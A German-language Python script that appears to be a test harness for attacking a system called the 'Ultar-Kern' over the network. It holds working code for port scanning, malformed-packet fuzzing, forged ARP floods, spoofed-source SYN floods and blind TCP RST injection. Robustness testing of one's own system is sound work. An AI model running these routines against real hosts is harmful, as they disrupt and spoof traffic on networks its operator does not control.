#!/usr/bin/env python3
"""Angriffe auf den Ultar-Kern über das Netz (läuft im Angreifer-Namensraum, braucht root).

  angriff.py scan    <ziel>            alle 65535 TCP-Ports + UDP/ICMP-Proben → offen/geschlossen/gefiltert
  angriff.py fuzz    <ziel> <iface> N  N kaputte/zufällige Rahmen (IPv4, TCP, UDP, ICMP, ARP, Fragmente)
  angriff.py arpflut <ziel> <iface> N  N gefälschte ARP-Antworten/-Anfragen
  angriff.py synflut <ziel> <iface> N <port>  N SYN-Pakete von zufälligen Absendern
  angriff.py rstflut <ziel> <iface> N <port>  blind eingeschleuste RST an eine bestehende Verbindung
  angriff.py hallo   <ziel> <port>      echter Verbindungsversuch (erwartet „hallo“)
Ausgabe als eine JSON-Zeile."""
import json, os, random, select, socket, struct, sys, time

def csum(b):
    if len(b) % 2:
        b += b"\0"
    s = sum(struct.unpack("!%dH" % (len(b) // 2), b))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def ip_hdr(src, dst, proto, plen, ihl=5, tot=None, frag=0, ident=None):
    h = struct.pack("!BBHHHBBH4s4s", (4 << 4) | ihl, 0, tot if tot is not None else 20 + plen, ident or random.randrange(65536), frag, 64, proto, 0, socket.inet_aton(src), socket.inet_aton(dst))
    return h[:10] + struct.pack("!H", csum(h)) + h[12:]

def tcp_seg(src, dst, sp, dp, seq, ack, flags, data=b"", off=5):
    t = struct.pack("!HHIIBBHHH", sp, dp, seq, ack, off << 4, flags, 65535, 0, 0) + data
    ph = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, 6, len(t))
    return t[:16] + struct.pack("!H", csum(ph + t)) + t[18:]

def mac_von(iface):
    return bytes.fromhex(open(f"/sys/class/net/{iface}/address").read().strip().replace(":", ""))

def ziel_mac(ziel):
    # ARP-Tabelle des Angreifers (nach einem Ping/Verbindungsversuch gefüllt)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.sendto(b"x", (ziel, 9)); s.close()
    except OSError:
        pass
    time.sleep(0.5)
    for z in open("/proc/net/arp").read().splitlines()[1:]:
        f = z.split()
        if f[0] == ziel and f[3] != "00:00:00:00:00:00":
            return bytes.fromhex(f[3].replace(":", ""))
    return b"\xff" * 6

def eigene_ip(iface):
    import fcntl
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack("256s", iface.encode()[:15]))[20:24])

def roh(iface):
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((iface, 0))
    return s

def scan(ziel):
    offen, zu = [], []
    ports = list(range(1, 65536))
    import resource
    resource.setrlimit(resource.RLIMIT_NOFILE, (min(8192, resource.getrlimit(resource.RLIMIT_NOFILE)[1]), resource.getrlimit(resource.RLIMIT_NOFILE)[1]))
    for i in range(0, len(ports), 2000):
        socks = {}
        for p in ports[i:i + 2000]:
            s = socket.socket(); s.setblocking(False)
            try:
                s.connect((ziel, p))
            except BlockingIOError:
                pass
            except OSError:
                s.close(); continue
            socks[s] = p
        ende = time.time() + 0.6
        po = select.poll(); nach_fd = {}
        for s in socks:
            po.register(s, select.POLLOUT); nach_fd[s.fileno()] = s
        while socks and time.time() < ende:
            for fd, _ in po.poll(max(0, int((ende - time.time()) * 1000))):
                s = nach_fd.get(fd)
                if s is None or s not in socks:
                    continue
                e = s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
                (offen if e == 0 else zu).append(socks[s]) if e in (0, 111) else None
                po.unregister(s); s.close(); del socks[s]
        for s in socks:
            s.close()
    # UDP-Probe und Ping
    u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); u.settimeout(1.5)
    udp = []
    for p in (8081, 47800, 53, 67, 123):
        try:
            u.sendto(b"probe", (ziel, p)); u.recvfrom(64); udp.append(p)
        except OSError:
            pass
    ping = False
    try:
        i = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP); i.settimeout(1.5)
        pk = struct.pack("!BBHHH", 8, 0, 0, 77, 1) + b"ultar"
        pk = pk[:2] + struct.pack("!H", csum(pk)) + pk[4:]
        i.sendto(pk, (ziel, 0))
        t = time.time()
        while time.time() - t < 1.5:
            d, a = i.recvfrom(256)
            if a[0] == ziel and d[20] == 0:
                ping = True; break
    except OSError:
        pass
    return {"tcp_offen": offen, "tcp_geschlossen_rst": len(zu), "udp_antwort": udp, "ping": ping}

def fuzz(ziel, iface, n):
    s = roh(iface); me = mac_von(iface); zm = ziel_mac(ziel); src = eigene_ip(iface)
    arten = {}
    for k in range(n):
        art = random.randrange(12)
        dp = random.choice([8080, 8081, 47800, 47801, random.randrange(65536)])
        if art == 0:      # reiner Zufall
            f = os.urandom(random.randrange(0, 1600))
        elif art == 1:    # IPv4 mit falscher IHL
            pl = os.urandom(random.randrange(0, 80))
            f = zm + me + b"\x08\x00" + ip_hdr(src, ziel, random.choice([1, 6, 17]), len(pl), ihl=random.choice([0, 1, 4, 6, 15]))[:random.randrange(1, 21)] + pl
        elif art == 2:    # Gesamtlänge gelogen
            pl = os.urandom(random.randrange(0, 60))
            f = zm + me + b"\x08\x00" + ip_hdr(src, ziel, random.choice([6, 17]), len(pl), tot=random.choice([0, 1, 19, 20, 21, 65535])) + pl
        elif art == 3:    # TCP mit unsinnigem Datenversatz/Flags
            seg = tcp_seg(src, ziel, random.randrange(65536), dp, random.getrandbits(32), random.getrandbits(32), random.randrange(256), os.urandom(random.randrange(0, 40)), off=random.choice([0, 1, 4, 5, 15]))
            seg = seg[:random.randrange(0, len(seg) + 1)]
            f = zm + me + b"\x08\x00" + ip_hdr(src, ziel, 6, len(seg)) + seg
        elif art == 4:    # UDP mit falscher Länge
            ul = random.choice([0, 1, 7, 8, 9, 65535])
            seg = struct.pack("!HHHH", random.randrange(65536), dp, ul, 0) + os.urandom(random.randrange(0, 64))
            f = zm + me + b"\x08\x00" + ip_hdr(src, ziel, 17, len(seg)) + seg
        elif art == 5:    # ICMP kaputt
            seg = bytes([random.choice([0, 3, 8, 11, 255])]) + os.urandom(random.randrange(0, 30))
            f = zm + me + b"\x08\x00" + ip_hdr(src, ziel, 1, len(seg)) + seg
        elif art == 6:    # ARP gekürzt/kaputt
            f = b"\xff" * 6 + me + b"\x08\x06" + os.urandom(random.randrange(0, 40))
        elif art == 7:    # Fragmente
            seg = os.urandom(random.randrange(8, 100))
            f = zm + me + b"\x08\x00" + ip_hdr(src, ziel, random.choice([6, 17]), len(seg), frag=random.choice([0x2000, 0x0001, 0x3fff, 0x1fff])) + seg
        elif art == 8:    # Rundruf-Müll auf den Verbund-Port
            seg = struct.pack("!HHHH", 47800, 47800, 8 + 200, 0) + os.urandom(200)
            f = b"\xff" * 6 + me + b"\x08\x00" + ip_hdr(src, "255.255.255.255", 17, len(seg)) + seg
        elif art == 9:    # gefälschte JSON-Meldung (überlang, falsche Felder)
            js = b'{"v":1,"k":"' + b"A" * random.randrange(0, 3000) + b'","n":"x","aktiv":true,"p":99999999999}'
            seg = struct.pack("!HHHH", 47800, 47800, 8 + len(js), 0) + js
            f = b"\xff" * 6 + me + b"\x08\x00" + ip_hdr(src, "255.255.255.255", 17, len(seg)) + seg
        elif art == 10:   # Riesenrahmen
            f = zm + me + b"\x08\x00" + os.urandom(random.randrange(1500, 9000))
        else:             # unbekannter Ethertyp / IPv6
            f = zm + me + random.choice([b"\x86\xdd", b"\x88\xcc", b"\x00\x00"]) + os.urandom(random.randrange(0, 200))
        arten[art] = arten.get(art, 0) + 1
        try:
            s.send(f[:9000])
        except OSError:
            pass
    return {"gesendet": n, "arten": len(arten)}

def arpflut(ziel, iface, n):
    s = roh(iface); me = mac_von(iface)
    for k in range(n):
        fake_ip = socket.inet_aton("10.%d.%d.%d" % (random.randrange(256), random.randrange(256), random.randrange(1, 255)))
        fake_mac = os.urandom(6)
        op = random.choice([1, 2])
        a = struct.pack("!HHBBH", 1, 0x0800, 6, 4, op) + fake_mac + fake_ip + b"\0" * 6 + socket.inet_aton(ziel)
        s.send(b"\xff" * 6 + me + b"\x08\x06" + a)
    return {"gesendet": n}

def synflut(ziel, iface, n, port):
    s = roh(iface); me = mac_von(iface); zm = ziel_mac(ziel)
    netz = ".".join(ziel.split(".")[:3])
    for k in range(n):
        src = "%s.%d" % (netz, random.randrange(100, 250))
        seg = tcp_seg(src, ziel, random.randrange(1024, 65535), port, random.getrandbits(32), 0, 0x02)
        s.send(zm + me + b"\x08\x00" + ip_hdr(src, ziel, 6, len(seg)) + seg)
    return {"gesendet": n}

def hallo(ziel, port, versuche=1):
    t = time.time(); letzt = ""
    for _ in range(versuche):
        try:
            c = socket.create_connection((ziel, port), timeout=3); c.settimeout(6); d = c.recv(64); c.close()
            return {"antwort": d.decode(errors="replace").strip(), "sekunden": round(time.time() - t, 1)}
        except OSError as e:
            letzt = str(e)
    return {"fehler": letzt}

def rstflut(ziel, iface, n, port):
    # bestehende Verbindung aufbauen, dann RSTs mit erratenen (falschen) Folgenummern einschleusen
    try:
        c = socket.create_connection((ziel, port), timeout=3)
    except OSError as e:
        return {"fehler": "keine Verbindung: %s" % e}
    sp = c.getsockname()[1]
    s = roh(iface); me = mac_von(iface); zm = ziel_mac(ziel); src = eigene_ip(iface)
    for k in range(n):
        seg = tcp_seg(src, ziel, sp, port, random.getrandbits(32), 0, 0x04)
        s.send(zm + me + b"\x08\x00" + ip_hdr(src, ziel, 6, len(seg)) + seg)
    try:
        c.settimeout(6)
        d = c.recv(64)   # der Dienst schreibt „hallo“ und schließt – kommt es an, hat kein RST getroffen
        return {"antwort": d.decode(errors="replace").strip()}
    except OSError as e:
        return {"fehler": str(e)}

if __name__ == "__main__":
    a = sys.argv[1:]
    f = {"scan": lambda: scan(a[1]), "fuzz": lambda: fuzz(a[1], a[2], int(a[3])), "arpflut": lambda: arpflut(a[1], a[2], int(a[3])),
         "synflut": lambda: synflut(a[1], a[2], int(a[3]), int(a[4])), "hallo": lambda: hallo(a[1], int(a[2]), int(a[3]) if len(a) > 3 else 1),
         "rstflut": lambda: rstflut(a[1], a[2], int(a[3]), int(a[4]))}[a[0]]
    print(json.dumps(f()))
